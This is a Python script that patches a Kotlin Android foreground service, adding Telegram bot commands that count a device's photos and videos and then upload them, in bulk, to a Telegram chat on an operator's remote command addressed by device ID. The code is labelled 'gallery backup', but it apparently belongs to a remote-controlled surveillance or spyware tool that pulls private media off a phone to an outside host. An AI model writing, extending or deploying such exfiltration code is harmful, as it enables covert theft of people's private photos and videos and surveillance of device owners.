with open("app/src/main/java/com/example/data/TelegramForegroundService.kt", "r") as f:
    content = f.read()

methods = """
    private suspend fun handleGalleryBackupCommand() {
        var pCount = 0
        var vCount = 0
        try {
            contentResolver.query(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(android.provider.MediaStore.MediaColumns._ID),
                null, null, null
            )?.use { cursor -> pCount = cursor.count }
            
            contentResolver.query(
                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                arrayOf(android.provider.MediaStore.MediaColumns._ID),
                null, null, null
            )?.use { cursor -> vCount = cursor.count }
        } catch (e: Exception) {
            TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Permission denied or error accessing media. Please ensure the app has Photos and Videos permissions.")
            return
        }

        val msg = \"\"\"📸 Device [${TelegramService.DEVICE_ID}] Media Backup
Found $pCount Photos and $vCount Videos.

To start backup, reply with:
`/startbackup [id] [type] [limit]`

Types: `both`, `photos`, `videos`
Limit: number of files (default all)

Example: `/startbackup ${TelegramService.DEVICE_ID} both 100`\"\"\"
        TelegramService.sendMessage(msg)
    }

    private suspend fun handleStartBackupCommand(args: String) {
        val argParts = args.split(" ")
        val typeStr = argParts.getOrNull(0)?.lowercase() ?: "both"
        val limit = argParts.getOrNull(1)?.toIntOrNull() ?: Int.MAX_VALUE

        TelegramService.sendMessage("⏳ [${TelegramService.DEVICE_ID}] Starting gallery backup (Type: $typeStr, Limit: ${if (limit == Int.MAX_VALUE) "All" else limit.toString()})...")

        val projection = arrayOf(
            android.provider.MediaStore.MediaColumns.DATA,
            android.provider.MediaStore.MediaColumns.DATE_ADDED
        )
        val filesToBackup = mutableListOf<com.example.MainActivity.MediaFile>()
        
        try {
            if (typeStr == "both" || typeStr == "photos") {
                contentResolver.query(
                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC"
                )?.use { cursor ->
                    val dataColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.MediaColumns.DATA)
                    val dateColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.MediaColumns.DATE_ADDED)
                    while (cursor.moveToNext()) {
                        filesToBackup.add(com.example.MainActivity.MediaFile(cursor.getString(dataColumn), cursor.getLong(dateColumn)))
                    }
                }
            }
            
            if (typeStr == "both" || typeStr == "videos") {
                contentResolver.query(
                    android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    android.provider.MediaStore.Video.Media.DATE_ADDED + " DESC"
                )?.use { cursor ->
                    val dataColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.MediaColumns.DATA)
                    val dateColumn = cursor.getColumnIndexOrThrow(android.provider.MediaStore.MediaColumns.DATE_ADDED)
                    while (cursor.moveToNext()) {
                        filesToBackup.add(com.example.MainActivity.MediaFile(cursor.getString(dataColumn), cursor.getLong(dateColumn)))
                    }
                }
            }
            
            val finalFiles = filesToBackup.sortedByDescending { it.dateAdded }.take(limit)
            
            TelegramService.sendMessage("📸 [${TelegramService.DEVICE_ID}] Uploading ${finalFiles.size} media files...")
            
            var successCount = 0
            for (media in finalFiles) {
                try {
                    val file = java.io.File(media.path)
                    if (file.exists()) {
                        if (media.path.endsWith(".mp4", true) || media.path.endsWith(".mkv", true)) {
                            TelegramService.sendDocument(file, "Backup Video: ${file.name}")
                        } else {
                            TelegramService.sendPhoto(file, "Backup Photo: ${file.name}")
                        }
                        successCount++
                        kotlinx.coroutines.delay(1000) // basic rate limit protection
                    }
                } catch (e: Exception) {
                    android.util.Log.e("GalleryBackup", "Failed to send ${media.path}", e)
                }
            }
            
            TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] Gallery backup completed. Successfully sent $successCount files.")
        } catch (e: Exception) {
            TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Error accessing gallery: ${e.message}")
        }
    }
"""

content = content.replace("    }\n}", "    }\n" + methods + "}")

with open("app/src/main/java/com/example/data/TelegramForegroundService.kt", "w") as f:
    f.write(content)

